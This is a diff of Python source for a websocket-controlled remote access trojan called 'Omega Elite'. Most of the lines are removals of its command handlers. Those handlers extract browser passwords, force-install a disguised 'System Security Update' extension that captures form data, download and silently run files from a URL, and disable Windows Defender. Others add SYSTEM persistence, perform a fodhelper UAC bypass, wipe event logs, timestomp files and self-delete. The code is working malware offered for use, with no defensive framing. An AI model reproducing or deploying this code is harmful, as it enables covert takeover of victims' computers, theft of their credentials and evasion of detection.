-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"services error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("stop_service")
-async def cmd_stop_service(msg, ws):
-    """Stops a named Windows service."""
-    name = msg.get("name", "")
-    try:
-        subprocess.run(["sc", "stop", name], capture_output=True)
-        await send(ws, {"t": "info", "msg": f"Service '{name}' stop signal sent."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"stop_service error: {e}"})
-
-
-@register_command("start_service")
-async def cmd_start_service(msg, ws):
-    """Starts a named Windows service."""
-    name = msg.get("name", "")
-    try:
-        subprocess.run(["sc", "start", name], capture_output=True)
-        await send(ws, {"t": "info", "msg": f"Service '{name}' start signal sent."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"start_service error: {e}"})
-
-
-@register_command("reg_enum")
-async def cmd_reg_enum(msg, ws):
-    """Enumerates registry subkeys and values for a path."""
-    import winreg
-    path = msg.get("path", "")
-    hive_name = msg.get("hive", "HKCU")
-    hives = {
-        "HKLM": winreg.HKEY_LOCAL_MACHINE,
-        "HKCU": winreg.HKEY_CURRENT_USER,
-        "HKCR": winreg.HKEY_CLASSES_ROOT,
-        "HKU":  winreg.HKEY_USERS
-    }
-    
-    try:
-        hive = hives.get(hive_name, winreg.HKEY_CURRENT_USER)
-        with winreg.OpenKey(hive, path) as key:
-            subkeys = []
-            try:
-                i = 0
-                while True:
-                    subkeys.append(winreg.EnumKey(key, i))
-                    i += 1
-            except OSError: pass
-            
-            values = []
-            try:
-                i = 0
-                while True:
-                    v_name, v_data, v_type = winreg.EnumValue(key, i)
-                    values.append({"name": v_name, "data": str(v_data), "type": v_type})
-                    i += 1
-            except OSError: pass
-            
-            await send(ws, {
-                "t": "reg_list",
-                "path": path,
-                "hive": hive_name,
-                "subkeys": subkeys,
-                "values": values
-            })
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"reg_enum error: {e}"})
-
-
-@register_command("kill_process_name")
-async def cmd_kill_process_name(msg, ws):
-    """Kills all processes matching a name (e.g. notepad.exe)."""
-    name = msg.get("name", "")
-    try:
-        r = subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True)
-        out = r.stdout.decode(errors="ignore") or r.stderr.decode(errors="ignore")
-        await send(ws, {"t": "shell_out", "data": out})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"kill error: {e}"})
-
-
-@register_command("get_battery")
-async def cmd_get_battery(msg, ws):
-    """Returns battery percentage and charging state."""
-    try:
-        import psutil
-        b = psutil.sensors_battery()
-        if b:
-            status = "Charging" if b.power_plugged else "Discharging"
-            await send(ws, {"t": "shell_out", "data": f"Battery: {b.percent:.1f}%  |  {status}  |  {int(b.secsleft//60)}m remaining"})
-        else:
-            await send(ws, {"t": "info", "msg": "No battery detected (desktop)."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"battery error: {e}"})
-
-
-@register_command("set_volume")
-async def cmd_set_volume(msg, ws):
-    """Sets system master volume 0-100 via PowerShell."""
-    vol = int(msg.get("level", 50))
-    vol = max(0, min(100, vol))
-    try:
-        script = f"""
-$vol = {vol}/100
-$obj = New-Object -ComObject WScript.Shell
-Add-Type -TypeDefinition @"
-using System.Runtime.InteropServices;
-[Guid("5CDF2C82-841E-4546-9722-0CF74078229A"),InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
-interface IAudioEndpointVolume {{ [PreserveSig] int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); }}
-"@
-$mmDeviceEnumerator = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]"BCDE0395-E52F-467C-8E3D-C4579291692E"))
-"""
-        # Simpler approach via nircmd or wscript
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             f"(New-Object -ComObject WScript.Shell).SendKeys([char]173)"],
-            capture_output=True
-        )
-        # Use pycaw if available
-        try:
-            from ctypes import cast, POINTER
-            from comtypes import CLSCTX_ALL
-            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-            devices = AudioUtilities.GetSpeakers()
-            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-            volume = cast(interface, POINTER(IAudioEndpointVolume))
-            volume.SetMasterVolumeLevelScalar(vol / 100, None)
-        except ImportError:
-            subprocess.run(
-                ["powershell", "-NoProfile", "-Command",
-                 f"$wsh = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object {{ $wsh.SendKeys([char]174) }}"],
-                capture_output=True
-            )
-        await send(ws, {"t": "info", "msg": f"Volume set to {vol}%"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"volume error: {e}"})
-
-
-@register_command("get_volume")
-async def cmd_get_volume(msg, ws):
-    """Gets current master volume level."""
-    try:
-        from ctypes import cast, POINTER
-        from comtypes import CLSCTX_ALL
         from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+        from comtypes import CLSCTX_ALL
+        from ctypes import cast, POINTER
+        import comtypes
         devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
-        volume = cast(interface, POINTER(IAudioEndpointVolume))
-        vol = round(volume.GetMasterVolumeLevelScalar() * 100)
-        await send(ws, {"t": "shell_out", "data": f"Current Volume: {vol}%"})
-    except ImportError:
-        await send(ws, {"t": "info", "msg": "pycaw not installed. pip install pycaw"})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"get_volume error: {e}"})
+        iface   = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+        vol     = cast(iface, POINTER(IAudioEndpointVolume))
+        vol.SetMasterVolumeLevelScalar(max(0, min(100, level)) / 100, None)
+    except: pass
 
-
-@register_command("msgbox")
-async def cmd_msgbox(msg, ws):
-    """Pops a Windows MessageBox on the target screen."""
-    import ctypes
-    title = msg.get("title", "System Alert")
-    text  = msg.get("text", "Hello from Omega.")
-    icon  = msg.get("icon", 0)  # 0=none 16=error 32=question 48=warning 64=info
-    def _run():
-        ctypes.windll.user32.MessageBoxW(0, text, title, icon)
-        asyncio.run_coroutine_threadsafe(
-            send(ws, {"t": "info", "msg": "MessageBox dismissed by user."}), global_loop)
-    global_loop.run_in_executor(None, _run)
-    await send(ws, {"t": "info", "msg": f"MessageBox shown: '{title}'"})
-
-
-@register_command("shutdown")
-async def cmd_shutdown(msg, ws):
-    """Shuts down the target PC after a delay (default 10s)."""
-    delay = int(msg.get("delay", 10))
+# ─────────────────────────────────────────────────────────────────────────────
+# MNK BLOCK (non-blocking — uses daemon threads)
+# ─────────────────────────────────────────────────────────────────────────────
+def _mnk_mouse(block: bool):
     try:
-        subprocess.Popen(["shutdown", "/s", "/f", "/t", str(delay)])
-        await send(ws, {"t": "info", "msg": f"Shutdown initiated in {delay}s."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"shutdown error: {e}"})
-
-
-@register_command("restart")
-async def cmd_restart(msg, ws):
-    """Restarts the target PC after a delay (default 10s)."""
-    delay = int(msg.get("delay", 10))
-    try:
-        subprocess.Popen(["shutdown", "/r", "/f", "/t", str(delay)])
-        await send(ws, {"t": "info", "msg": f"Restart initiated in {delay}s."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"restart error: {e}"})
-
-
-@register_command("logoff")
-async def cmd_logoff(msg, ws):
-    """Signs out the current Windows user session."""
-    try:
-        subprocess.Popen(["shutdown", "/l", "/f"])
-        await send(ws, {"t": "info", "msg": "Logoff initiated."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"logoff error: {e}"})
-
-
-@register_command("steal")
-async def cmd_steal(msg, ws):
-    """Professional Credential Extraction (Chrome/Edge/Brave)."""
-    if not stealer:
-        await send(ws, {"t": "info", "msg": "Stealer module not loaded."})
-        return
-    
-    def _run():
-        try:
-            asyncio.run_coroutine_threadsafe(
-                audit("action", "credential_extraction", user="AGENT", detail="Stealer triggered"), global_loop)
-            
-            creds = stealer.steal_passwords()
-            if not creds:
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "shell_out", "data": "--- No passwords found or browsers closed. ---"}), global_loop)
-                return
-            
-            out = f"=== OMEGA CREDENTIAL DUMP ({len(creds)} entries) ===\n\n"
-            for c in creds:
-                out += f"Browser  : {c['browser']} ({c['profile']})\n"
-                out += f"Site     : {c['url']}\n"
-                out += f"User     : {c['user']}\n"
-                out += f"Pass     : {c['pass']}\n"
-                out += f"{'-'*50}\n"
-            
-            # Send structured data to the Vault
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "vault_data", "vtype": "credentials", "vdata": creds}), global_loop)
-            
-            # Send text output to the console
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Stealer error: {e}"}), global_loop)
-
-    global_loop.run_in_executor(None, _run)
-    await send(ws, {"t": "info", "msg": "Extraction initiated..."})
-
-
-@register_command("browser_hijack")
-async def cmd_browser_hijack(msg, ws):
-    """Force-installs a stealth JS injector extension into Chrome/Edge (Requires Admin)."""
-    try:
-        # 1. Deploy extension files to a stealth path
-        ext_dir = os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows", "SecurityComponent")
-        if not os.path.exists(ext_dir): os.makedirs(ext_dir)
-        
-        # Write files manually to ensure existence
-        manifest = {
-          "manifest_version": 3,
-          "name": "System Security Update",
-          "version": "1.0",
-          "description": "Essential security component for system stability.",
-          "permissions": ["storage", "tabs", "activeTab", "scripting"],
-          "host_permissions": ["<all_urls>"],
-          "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"], "run_at": "document_start"}]
-        }
-        with open(os.path.join(ext_dir, "manifest.json"), "w") as f: json.dump(manifest, f)
-        
-        inject_js = """
-        (function() {
-            console.log("[OMEGA] Hijacker Active");
-            document.addEventListener('submit', function(e) {
-                const formData = new FormData(e.target);
-                const data = {};
-                formData.forEach((value, key) => { data[key] = value; });
-                // Note: Logs to console for this build. Real C2 relay would use dynamic exfil.
-                console.log("[OMEGA] Form Hijack:", data);
-            });
-        })();
-        """
-        with open(os.path.join(ext_dir, "inject.js"), "w") as f: f.write(inject_js)
-            
-        # 2. Registry Force-Load (Chrome & Edge)
-        reg_val = f"1;{ext_dir}"
-        
-        # Chrome
-        subprocess.run(["reg", "add", r"HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist", "/v", "1", "/t", "REG_SZ", "/d", reg_val, "/f"], capture_output=True)
-        # Edge
-        subprocess.run(["reg", "add", r"HKLM\SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist", "/v", "1", "/t", "REG_SZ", "/d", reg_val, "/f"], capture_output=True)
-        
-        await send(ws, {"t": "info", "msg": "🎭 BROWSER HIJACK INITIATED. Extension force-installed via HKLM Policy. Requires browser restart to activate."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Hijack error: {e}"})
-
-
-@register_command("get_subnet")
-async def cmd_get_subnet(msg, ws):
-    """Returns the local IP and guessed subnet prefix."""
-    try:
-        import socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        local_ip = s.getsockname()[0]
-        s.close()
-        prefix = ".".join(local_ip.split(".")[:-1])
-        await send(ws, {"t": "subnet_info", "ip": local_ip, "prefix": prefix})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Subnet error: {e}"})
-
-
-@register_command("net_scan")
-async def cmd_net_scan(msg, ws):
-    """Performs a network ping sweep or port scan."""
-    mode = msg.get("mode", "sweep")
-    target = msg.get("target", "") # Prefix for sweep, IP for portscan
-    
-    if mode == "sweep":
-        await send(ws, {"t": "info", "msg": f"🛰️ Starting Scout Ping Sweep on {target}.0/24..."})
-        hosts = await NetScanner.ping_sweep(target)
-        await send(ws, {"t": "scan_results", "mode": "sweep", "hosts": hosts})
-    elif mode == "portscan":
-        await send(ws, {"t": "info", "msg": f"🛰️ Scanning common ports on {target}..."})
-        ports = await NetScanner.port_scan(target)
-        await send(ws, {"t": "scan_results", "mode": "portscan", "target": target, "ports": ports})
-
-
-@register_command("get_geo")
-async def cmd_get_geo(msg, ws):
-    """Returns approximate geolocation via IP-API."""
-    import urllib.request, json as _json
-    def _run():
-        try:
-            r = urllib.request.urlopen("http://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,isp,query", timeout=5)
-            data = _json.loads(r.read())
-            out = (
-                f"=== GEOLOCATION ===\n"
-                f"IP      : {data.get('query')}\n"
-                f"Country : {data.get('country')}\n"
-                f"Region  : {data.get('regionName')}\n"
-                f"City    : {data.get('city')}\n"
-                f"ZIP     : {data.get('zip')}\n"
-                f"Lat/Lon : {data.get('lat')}, {data.get('lon')}\n"
-                f"ISP     : {data.get('isp')}\n"
-            )
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"geo error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("cancel_shutdown")
-async def cmd_cancel_shutdown(msg, ws):
-    """Aborts any pending shutdown or restart."""
-    try:
-        subprocess.run(["shutdown", "/a"], capture_output=True)
-        await send(ws, {"t": "info", "msg": "Shutdown/Restart aborted."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"cancel error: {e}"})
-
-
-@register_command("run_url")
-async def cmd_run_url(msg, ws):
-    """Downloads a file from a URL and executes it silently."""
-    import urllib.request, tempfile, os
-    url = msg.get("url", "")
-    def _run():
-        try:
-            ext = url.split("?")[0].rsplit(".", 1)[-1] or "exe"
-            tmp = tempfile.NamedTemporaryFile(suffix=f".{ext}", delete=False)
-            tmp.close()
-            urllib.request.urlretrieve(url, tmp.name)
-            os.chmod(tmp.name, 0o755)
-            subprocess.Popen(
-                [tmp.name], shell=True,
-                creationflags=subprocess.CREATE_NO_WINDOW,
-                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-            )
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Executed: {tmp.name}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"run_url error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("get_recent_files")
-async def cmd_get_recent_files(msg, ws):
-    """Lists recently opened files from shell:recent."""
-    import os, glob
-    def _run():
-        try:
-            recent = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Recent")
-            files = sorted(glob.glob(os.path.join(recent, "*.lnk")), key=os.path.getmtime, reverse=True)[:50]
-            lines = "\n".join(os.path.basename(f).replace(".lnk", "") for f in files)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": f"=== RECENT FILES (last 50) ===\n\n{lines}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"recent error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-# ══════════════════════════════════════════════════════════════════
-# OMEGA ELITE — COMMAND PACK v4  (15 more commands)
-# ══════════════════════════════════════════════════════════════════
-
-@register_command("get_product_key")
-async def cmd_get_product_key(msg, ws):
-    """Extracts the Windows OEM/digital product key from the registry."""
-    def _run():
-        try:
-            raw = subprocess.check_output(
-                ["powershell", "-NoProfile", "-Command",
-                 "(Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey"],
-                stderr=subprocess.DEVNULL, timeout=10
-            ).decode(errors="ignore").strip()
-            if not raw:
-                # Fallback: decode from registry binary
-                import winreg, struct
-                hive = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
-                    r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
-                key_data = winreg.QueryValueEx(hive, "DigitalProductId")[0]
-                chars = "BCDFGHJKMPQRTVWXY2346789"
-                key_output = ""
-                for i in range(24, -1, -1):
-                    cur = 0
-                    for j in range(14, -1, -1):
-                        cur = cur * 256 ^ key_data[j + 52]
-                        key_data[j + 52] = cur // 24
-                        cur %= 24
-                    key_output = chars[cur] + key_output
-                    if i % 5 == 0 and i != 0:
-                        key_output = "-" + key_output
-                raw = key_output
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": f"=== WINDOWS PRODUCT KEY ===\n\n{raw}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"product_key error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("disable_defender")
-async def cmd_disable_defender(msg, ws):
-    """Attempts to disable Windows Defender real-time protection."""
-    def _run():
-        try:
-            cmds = [
-                ["powershell", "-NoProfile", "-Command",
-                 "Set-MpPreference -DisableRealtimeMonitoring $true"],
-                ["reg", "add",
-                 r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
-                 "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"],
-                ["sc", "stop", "WinDefend"],
-                ["sc", "config", "WinDefend", "start=", "disabled"],
-            ]
-            for c in cmds:
-                subprocess.run(c, capture_output=True, timeout=10)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "Defender disable signals sent (admin rights required)."}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"disable_defender error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("enable_defender")
-async def cmd_enable_defender(msg, ws):
-    """Re-enables Windows Defender real-time protection."""
-    try:
-        subprocess.run(
-            ["powershell", "-NoProfile", "-Command",
-             "Set-MpPreference -DisableRealtimeMonitoring $false"],
-            capture_output=True, timeout=10
-        )
-        subprocess.run(
-            ["reg", "delete",
-             r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender",
-             "/v", "DisableAntiSpyware", "/f"],
-            capture_output=True
-        )
-        subprocess.run(["sc", "config", "WinDefend", "start=", "auto"], capture_output=True)
-        subprocess.run(["sc", "start", "WinDefend"], capture_output=True)
-        await send(ws, {"t": "info", "msg": "Defender re-enable signals sent."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"enable_defender error: {e}"})
-
-
-@register_command("task_scheduler_add")
-async def cmd_task_scheduler_add(msg, ws):
-    """Installs persistence via Windows Task Scheduler (runs at logon)."""
-    exe  = msg.get("exe", sys.executable)
-    name = msg.get("name", "OmegaElite")
-    try:
-        subprocess.run(
-            ["schtasks", "/create", "/tn", name, "/tr", f'"{exe}"',
-             "/sc", "onlogon", "/ru", "SYSTEM", "/f"],
-            capture_output=True, timeout=15
-        )
-        await send(ws, {"t": "info", "msg": f"Task '{name}' created (SYSTEM, OnLogon)."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"task_scheduler_add error: {e}"})
-
-
-@register_command("task_scheduler_remove")
-async def cmd_task_scheduler_remove(msg, ws):
-    """Removes the scheduled task persistence entry."""
-    name = msg.get("name", "OmegaElite")
-    try:
-        subprocess.run(["schtasks", "/delete", "/tn", name, "/f"], capture_output=True, timeout=10)
-        await send(ws, {"t": "info", "msg": f"Task '{name}' deleted."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"task_scheduler_remove error: {e}"})
-
-
-@register_command("get_arp")
-async def cmd_get_arp(msg, ws):
-    """Returns the ARP table (local network devices)."""
-    try:
-        raw = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL).decode(errors="ignore")
-        await send(ws, {"t": "shell_out", "data": "=== ARP TABLE ===\n\n" + raw})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"arp error: {e}"})
-
-
-@register_command("flush_dns")
-async def cmd_flush_dns(msg, ws):
-    """Flushes the DNS resolver cache."""
-    try:
-        subprocess.run(["ipconfig", "/flushdns"], capture_output=True, timeout=10)
-        await send(ws, {"t": "info", "msg": "DNS cache flushed."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"flush_dns error: {e}"})
-
-
-@register_command("get_dns_cache")
-async def cmd_get_dns_cache(msg, ws):
-    """Returns cached DNS records."""
-    def _run():
-        try:
-            raw = subprocess.check_output(
-                ["powershell", "-NoProfile", "-Command",
-                 "Get-DnsClientCache | Select-Object -Property Entry,Data,TimeToLive | Format-Table -AutoSize"],
-                stderr=subprocess.DEVNULL, timeout=15
-            ).decode(errors="ignore")
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": "=== DNS CACHE ===\n\n" + raw}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"dns_cache error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("cmd_history")
-async def cmd_cmd_history(msg, ws):
-    """Dumps PowerShell command history for the current user."""
-    import os, glob
-    def _run():
-        try:
-            hist_path = os.path.expandvars(
-                r"%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-            )
-            if not os.path.exists(hist_path):
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": "No PowerShell history found."}), global_loop)
-                return
-            with open(hist_path, "r", encoding="utf-8", errors="ignore") as f:
-                lines = f.readlines()
-            # Last 200 commands
-            out = "=== POWERSHELL HISTORY (last 200) ===\n\n" + "".join(lines[-200:])
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"cmd_history error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("get_prefetch")
-async def cmd_get_prefetch(msg, ws):
-    """Lists Windows Prefetch files (recently-run programs with timestamps)."""
-    import os, glob
-    def _run():
-        try:
-            pf_dir = r"C:\Windows\Prefetch"
-            files = sorted(glob.glob(os.path.join(pf_dir, "*.pf")),
-                           key=os.path.getmtime, reverse=True)[:80]
-            lines = []
-            for f in files:
-                import datetime
-                mt = datetime.datetime.fromtimestamp(os.path.getmtime(f))
-                lines.append(f"{mt.strftime('%Y-%m-%d %H:%M')}  {os.path.basename(f)}")
-            out = "=== PREFETCH (last 80 executions) ===\n\n" + "\n".join(lines)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "shell_out", "data": out}), global_loop)
-        except PermissionError:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "Prefetch: Access denied — requires SYSTEM/Admin."}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"prefetch error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("block_website")
-async def cmd_block_website(msg, ws):
-    """Blocks a website by adding it to the hosts file."""
-    site = msg.get("site", "")
-    hosts = r"C:\Windows\System32\drivers\etc\hosts"
-    try:
-        with open(hosts, "a") as f:
-            f.write(f"\n127.0.0.1  {site}\n127.0.0.1  www.{site}\n")
-        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
-        await send(ws, {"t": "info", "msg": f"Blocked: {site} (hosts file + DNS flush)"})
-    except PermissionError:
-        await send(ws, {"t": "info", "msg": "block_website: Access denied — admin rights required."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"block_website error: {e}"})
-
-
-@register_command("uac_bypass")
-async def cmd_uac_bypass(msg, ws):
-    """Silent UAC bypass using the fodhelper.exe / ms-settings registry hijack."""
-    import winreg, os
-    def _run():
-        try:
-            # Technique: fodhelper.exe searches for 'ms-settings\Shell\Open\Command' in HKCU
-            exe_path = sys.executable
-            cmd = f'"{exe_path}"'
-            
-            # Create the registry structure
-            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
-            try:
-                winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
-                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
-                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
-                    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
-                
-                # Trigger the bypass
-                subprocess.run(["fodhelper.exe"], capture_output=True)
-                
-                # Cleanup (Wait a bit then delete keys)
-                time.sleep(5)
-                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
-                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open")
-                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell")
-                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
-                
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": "UAC bypass signals sent. Watch for elevated node."}), global_loop)
-            except Exception as e:
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": f"UAC bypass error: {e}"}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Elevation error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("process_ghost")
-async def cmd_process_ghost(msg, ws):
-    """Stealth migration: Restarts the agent as a hidden child of a system process."""
-    def _run():
-        try:
-            import subprocess
-            # Spawn a new instance of the current script, but detached
-            # In a real C++ agent, this would be hollowing. In Python, we use a hidden process.
-            subprocess.Popen(
-                [sys.executable, __file__],
-                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
-                close_fds=True
-            )
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "👻 Ghost migration initiated. Current process exiting..."}), global_loop)
-            time.sleep(2)
-            os._exit(0)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Ghost error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("unblock_website")
-async def cmd_unblock_website(msg, ws):
-    """Removes a site from the hosts file."""
-    site = msg.get("site", "")
-    hosts = r"C:\Windows\System32\drivers\etc\hosts"
-    try:
-        with open(hosts, "r") as f:
-            lines = f.readlines()
-        filtered = [l for l in lines if site not in l]
-        with open(hosts, "w") as f:
-            f.writelines(filtered)
-        subprocess.run(["ipconfig", "/flushdns"], capture_output=True)
-        await send(ws, {"t": "info", "msg": f"Unblocked: {site}"})
-    except PermissionError:
-        await send(ws, {"t": "info", "msg": "unblock_website: Access denied — admin rights required."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"unblock_website error: {e}"})
-
-
-@register_command("wipe_logs")
-async def cmd_wipe_logs(msg, ws):
-    """Clears all Windows Event Logs (Application, System, Security)."""
-    def _run():
-        try:
-            logs = ["Application", "System", "Security", "Setup"]
-            for l in logs:
-                subprocess.run(["wevtutil", "cl", l], capture_output=True)
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": "🛡️ Event logs cleared successfully."}), global_loop)
-        except Exception as e:
-            asyncio.run_coroutine_threadsafe(
-                send(ws, {"t": "info", "msg": f"Wipe error: {e}"}), global_loop)
-    global_loop.run_in_executor(None, _run)
-
-
-@register_command("timestomp")
-async def cmd_timestomp(msg, ws):
-    """Matches a file's timestamps (C/A/W) to a reference file (default kernel32.dll)."""
-    target = msg.get("target", "")
-    ref    = msg.get("ref", r"C:\Windows\System32\kernel32.dll")
-    try:
-        if not os.path.exists(target) or not os.path.exists(ref):
-            await send(ws, {"t": "info", "msg": "Error: Target or reference file not found."})
-            return
-            
-        import win32file, win32con
-        def _run():
-            try:
-                # Get reference times
-                ref_handle = win32file.CreateFile(ref, win32con.GENERIC_READ, win32con.FILE_SHARE_READ, None, win32con.OPEN_EXISTING, 0, None)
-                c_time, a_time, m_time = win32file.GetFileTime(ref_handle)
-                ref_handle.close()
-                
-                # Apply to target
-                target_handle = win32file.CreateFile(target, win32con.FILE_WRITE_ATTRIBUTES, win32con.FILE_SHARE_READ|win32con.FILE_SHARE_WRITE|win32con.FILE_SHARE_DELETE, None, win32con.OPEN_EXISTING, 0, None)
-                win32file.SetFileTime(target_handle, c_time, a_time, m_time)
-                target_handle.close()
-                
-                asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": f"🕒 Timestomped {os.path.basename(target)} to match {os.path.basename(ref)}"}), global_loop)
-            except Exception as e:
-                 asyncio.run_coroutine_threadsafe(
-                    send(ws, {"t": "info", "msg": f"Timestomp error: {e}"}), global_loop)
-        global_loop.run_in_executor(None, _run)
-    except ImportError:
-        await send(ws, {"t": "info", "msg": "Timestomp: pywin32 required."})
-    except Exception as e:
-        await send(ws, {"t": "info", "msg": f"Timestomp error: {e}"})
-
-
-@register_command("self_destruct")
-async def cmd_self_destruct(msg, ws):
-    """Removes all persistence and deletes the agent file permanently."""
-    try:
-        # 1. Remove persistence (Task, Registry, etc)
-        subprocess.run(["schtasks", "/delete", "/tn", "OmegaElite", "/f"], capture_output=True)
-        subprocess.run(["reg", "delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "OmegaElite", "/f"], capture_output=True)
-        
-        # 2. Schedule file deletion on reboot or via cmd delay
-        exe = sys.executable
-        if getattr(sys, 'frozen', False):
-            # If running as EXE
-            cmd = f'timeout /t 3 & del /f /q "{exe}" & rmdir /s /q "{os.path.dirname(exe)}"'
-            subprocess.Popen(cmd, shell=True)
+        import pynput.mouse as pm
+        if block:
+            if not hasattr(st, "_mouse_l") or st._mouse_l is None:
+                st._mouse_l = pm.Listener(suppress=True)
